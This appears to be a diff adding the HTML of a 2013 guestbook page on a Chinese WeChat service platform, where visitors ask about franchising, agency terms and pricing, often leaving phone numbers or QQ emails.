+																														<a class="hhbt czan" date="6922" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6922">
+											<textarea name="info" class="pxtextarea hly6922"></textarea> 
+										<a class="hhsubmit submit" date="6922" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								娜依鞋吧<span>2013-11-27 22:12:36</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6918">怎么代理的，我嘉兴人</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6918" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6918">
+											<textarea name="info" class="pxtextarea hly6918"></textarea> 
+										<a class="hhsubmit submit" date="6918" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								峰哥<span>2013-11-27 18:56:35</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6869">区域代理怎么做的，有没相关的资料发到我QQ邮箱：931306603@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6869" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6869">
+											<textarea name="info" class="pxtextarea hly6869"></textarea> 
+										<a class="hhsubmit submit" date="6869" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								娜依鞋吧<span>2013-11-27 18:30:31</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6864">微活动怎么内容，方式，收费么，怎么收费标准
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6864" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6864">
+											<textarea name="info" class="pxtextarea hly6864"></textarea> 
+										<a class="hhsubmit submit" date="6864" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								娜依鞋吧<span>2013-11-27 18:05:03</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6861">我还是不太明白，但挺有兴趣，希望你们能联系我15168013797</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6861" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6861">
+											<textarea name="info" class="pxtextarea hly6861"></textarea> 
+										<a class="hhsubmit submit" date="6861" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								sooflife<span>2013-11-27 17:18:04</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6851">请问怎么加盟呢  资料请发送邮箱852136921谢谢</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6851" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6851">
+											<textarea name="info" class="pxtextarea hly6851"></textarea> 
+										<a class="hhsubmit submit" date="6851" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								荷塘月色<span>2013-11-27 16:27:10</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6836">加盟  请联系我</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6836" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6836">
+											<textarea name="info" class="pxtextarea hly6836"></textarea> 
+										<a class="hhsubmit submit" date="6836" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								很不错<span>2013-11-27 16:10:00</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6832">学习了</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6832" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6832">
+											<textarea name="info" class="pxtextarea hly6832"></textarea> 
+										<a class="hhsubmit submit" date="6832" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								边城<span>2013-11-27 15:32:03</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6821">怎么用你们的互动接口？联系</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6821" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6821">
+											<textarea name="info" class="pxtextarea hly6821"></textarea> 
+										<a class="hhsubmit submit" date="6821" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								爷爷家里人<span>2013-11-27 14:50:00</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6812">区域代理怎么做的，有没相关的资料发到我QQ邮箱：1245512355@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6812" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6812">
+											<textarea name="info" class="pxtextarea hly6812"></textarea> 
+										<a class="hhsubmit submit" date="6812" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								sooflife<span>2013-11-27 14:43:55</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6811">你好！我想知道怎么才能够加盟这个微店呢？加盟需要资金吗？加盟需要些什么条件呢？     我的QQ邮箱1127254743@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6811" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6811">
+											<textarea name="info" class="pxtextarea hly6811"></textarea> 
+										<a class="hhsubmit submit" date="6811" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								乐淘潮品<span>2013-11-27 12:56:12</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6787">想把自己的微信号做成这样，在微信上给客户服务，是一定要服务号吗？订阅号能做成这样的吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6787" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6787">
+											<textarea name="info" class="pxtextarea hly6787"></textarea> 
+										<a class="hhsubmit submit" date="6787" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								sooflife<span>2013-11-26 21:52:30</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6719">区域代理怎么做的，有没相关的资料发到我QQ邮箱：23517769@qq.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6719" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6719">
+											<textarea name="info" class="pxtextarea hly6719"></textarea> 
+										<a class="hhsubmit submit" date="6719" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								很不错<span>2013-11-26 19:39:56</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6706">界面挺有特色的</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6706" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6706">
+											<textarea name="info" class="pxtextarea hly6706"></textarea> 
+										<a class="hhsubmit submit" date="6706" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>很不错回复：嗯不错 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								啊<span>2013-11-26 16:11:49</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6664">你好，优惠券功能怎么用？你们的qq客服都太忙了，没人应答。</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6664" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6664">
+											<textarea name="info" class="pxtextarea hly6664"></textarea> 
+										<a class="hhsubmit submit" date="6664" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								我们的天空<span>2013-11-26 14:32:05</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6621">怎么加盟？？还有，我们自己去做客服？？还是网站自动回复？？联系邮箱320803554@qq.com
+1172345952@qq.com
+18037053250</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6621" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6621">
+											<textarea name="info" class="pxtextarea hly6621"></textarea> 
+										<a class="hhsubmit submit" date="6621" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								钱有用<span>2013-11-26 09:56:56</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6589">请问怎么加盟，我怎么盛世源码—国内优秀的微信公众服务平台推销产品</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6589" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6589">
+											<textarea name="info" class="pxtextarea hly6589"></textarea> 
+										<a class="hhsubmit submit" date="6589" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								过客<span>2013-11-25 22:33:30</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6565">我想加盟在武汉做</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6565" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6565">
+											<textarea name="info" class="pxtextarea hly6565"></textarea> 
+										<a class="hhsubmit submit" date="6565" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								TTT<span>2013-11-25 21:39:46</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6557">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6557" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6557">
+											<textarea name="info" class="pxtextarea hly6557"></textarea> 
+										<a class="hhsubmit submit" date="6557" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								ANDY<span>2013-11-25 20:49:44</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6550">1.怎么升级
+2.试用期内做的网站怎么查看
+3.都有那些功能</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6550" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6550">
+											<textarea name="info" class="pxtextarea hly6550"></textarea> 
+										<a class="hhsubmit submit" date="6550" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								老丢人<span>2013-11-25 19:42:12</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6540">怎么加盟</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6540" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6540">
+											<textarea name="info" class="pxtextarea hly6540"></textarea> 
+										<a class="hhsubmit submit" date="6540" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								黄健<span>2013-11-25 18:02:11</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6533">我们要做和微信订阅号关联的微官网，想咨询下价格，联系电话：15352198540    樊先生</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6533" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6533">
+											<textarea name="info" class="pxtextarea hly6533"></textarea> 
+										<a class="hhsubmit submit" date="6533" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								海洋<span>2013-11-25 16:31:47</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6523">请问如何加盟</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6523" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6523">
+											<textarea name="info" class="pxtextarea hly6523"></textarea> 
+										<a class="hhsubmit submit" date="6523" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								李菲<span>2013-11-25 15:25:49</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6511">我想多了解一下  电联可以吗?15695880530</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6511" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6511">
+											<textarea name="info" class="pxtextarea hly6511"></textarea> 
+										<a class="hhsubmit submit" date="6511" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								我下一站<span>2013-11-25 10:35:42</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6468">不错不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6468" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6468">
+											<textarea name="info" class="pxtextarea hly6468"></textarea> 
+										<a class="hhsubmit submit" date="6468" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								妞妞<span>2013-11-24 16:53:12</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6416">想做一个</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6416" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6416">
+											<textarea name="info" class="pxtextarea hly6416"></textarea> 
+										<a class="hhsubmit submit" date="6416" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								李<span>2013-11-24 10:40:28</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6383">请问如何收费？模块分类收费吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6383" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6383">
+											<textarea name="info" class="pxtextarea hly6383"></textarea> 
+										<a class="hhsubmit submit" date="6383" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								永<span>2013-11-24 08:45:11</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6377">怎么加盟？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6377" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6377">
+											<textarea name="info" class="pxtextarea hly6377"></textarea> 
+										<a class="hhsubmit submit" date="6377" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								福建小李<span>2013-11-24 03:29:04</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6375">怎么加盟  </dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6375" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6375">
+											<textarea name="info" class="pxtextarea hly6375"></textarea> 
+										<a class="hhsubmit submit" date="6375" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈喽<span>2013-11-24 03:23:05</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6374">如何建设微商城  我想加入盛世源码</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6374" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6374">
+											<textarea name="info" class="pxtextarea hly6374"></textarea> 
+										<a class="hhsubmit submit" date="6374" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								会计康伶伶<span>2013-11-23 19:43:20</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6351">考虑考虑</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6351" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6351">
+											<textarea name="info" class="pxtextarea hly6351"></textarea> 
+										<a class="hhsubmit submit" date="6351" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								123<span>2013-11-23 10:17:53</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6297">盛世源码—国内优秀的微信公众服务平台如何和微信公众平台对接？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6297" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6297">
+											<textarea name="info" class="pxtextarea hly6297"></textarea> 
+										<a class="hhsubmit submit" date="6297" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								萤火虫<span>2013-11-22 23:47:02</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6280">想加盟，能发资料了解吗？谢谢！
+firefly_flash@163.com</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6280" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6280">
+											<textarea name="info" class="pxtextarea hly6280"></textarea> 
+										<a class="hhsubmit submit" date="6280" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								馒头<span>2013-11-22 23:06:59</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6278">怎么代理</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6278" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6278">
+											<textarea name="info" class="pxtextarea hly6278"></textarea> 
+										<a class="hhsubmit submit" date="6278" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								夏日<span>2013-11-22 22:01:32</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6270">我想在盛世源码—国内优秀的微信公众服务平台里面做代理，怎么加盟啊！有没有收费啊？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6270" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6270">
+											<textarea name="info" class="pxtextarea hly6270"></textarea> 
+										<a class="hhsubmit submit" date="6270" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								宁德代理商<span>2013-11-22 21:08:20</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6266">本来看好别家了，认识盛世源码—国内优秀的微信公众服务平台真有相见恨晚，要做就做最好的！盛世源码—国内优秀的微信公众服务平台我爱你！福建宁德的朋友联系我吧！我电话：18950509811</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6266" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6266">
+											<textarea name="info" class="pxtextarea hly6266"></textarea> 
+										<a class="hhsubmit submit" date="6266" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								xiaoming<span>2013-11-22 17:22:57</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6200">我对威信营销和微商城特别感兴趣 我希望加盟 请给我资料 </dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6200" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6200">
+											<textarea name="info" class="pxtextarea hly6200"></textarea> 
+										<a class="hhsubmit submit" date="6200" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈喽<span>2013-11-22 14:33:22</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6133">你好 我想问一下怎么做 需要投资多少钱 </dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6133" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6133">
+											<textarea name="info" class="pxtextarea hly6133"></textarea> 
+										<a class="hhsubmit submit" date="6133" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								马先生<span>2013-11-22 13:14:34</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6110">我是做餐饮的 怎么合作</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6110" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6110">
+											<textarea name="info" class="pxtextarea hly6110"></textarea> 
+										<a class="hhsubmit submit" date="6110" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈喽<span>2013-11-22 12:34:19</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6105">如何加盟，怎么收费？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6105" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6105">
+											<textarea name="info" class="pxtextarea hly6105"></textarea> 
+										<a class="hhsubmit submit" date="6105" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								80后<span>2013-11-22 11:11:54</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6094">你好，请问护肤品可以加盟吗</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6094" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6094">
+											<textarea name="info" class="pxtextarea hly6094"></textarea> 
+										<a class="hhsubmit submit" date="6094" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈喽<span>2013-11-21 17:32:39</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6026">怎么个加盟法？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6026" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6026">
+											<textarea name="info" class="pxtextarea hly6026"></textarea> 
+										<a class="hhsubmit submit" date="6026" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复： 我也想知道啊 
+																										</span></dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>回复：请拨打电话详谈：18604763987 
+																										</span></dt>
+							</dl>
+														<dl class="huifu">
+								<dt><span>我回复：解决了 
+																										</span></dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								田<span>2013-11-21 16:40:33</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6017">微活动怎么内容，方式，收费么，怎么收费标准</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="6017" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly6017">
+											<textarea name="info" class="pxtextarea hly6017"></textarea> 
+										<a class="hhsubmit submit" date="6017" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								大象<span>2013-11-21 14:10:12</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="6001">360做的不错！</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
